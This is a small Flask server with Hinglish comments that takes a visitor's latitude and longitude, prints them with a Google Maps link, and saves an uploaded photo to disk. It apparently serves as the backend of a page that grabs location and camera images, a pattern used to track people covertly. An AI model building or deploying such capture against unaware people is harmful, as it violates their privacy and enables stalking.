from flask import Flask, render_template, request
import os

app = Flask(__name__)

UPLOAD_FOLDER = "photos"

# Photos folder automatically create karega
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

# Home Page
@app.route("/")
def home():
    return render_template("index.html")

# Location Save
@app.route("/save-location", methods=["POST"])
def save_location():

    data = request.json

    latitude = data.get("latitude")
    longitude = data.get("longitude")

    print("\n========== LOCATION RECEIVED ==========")
    print("Latitude :", latitude)
    print("Longitude:", longitude)

    map_link = f"https://maps.google.com/?q={latitude},{longitude}"

    print("Google Maps Link:")
    print(map_link)

    return {
        "status": "success"
    }

# Photo Upload
@app.route("/upload", methods=["POST"])
def upload():

    file = request.files["photo"]

    filepath = os.path.join(UPLOAD_FOLDER, "photo.png")

    file.save(filepath)

    print("\n========== PHOTO SAVED ==========")
    print("Saved in photos/photo.png")

    return {
        "status": "uploaded"
    }

# Run Server
if __name__ == "__main__":
    app.run(debug=True)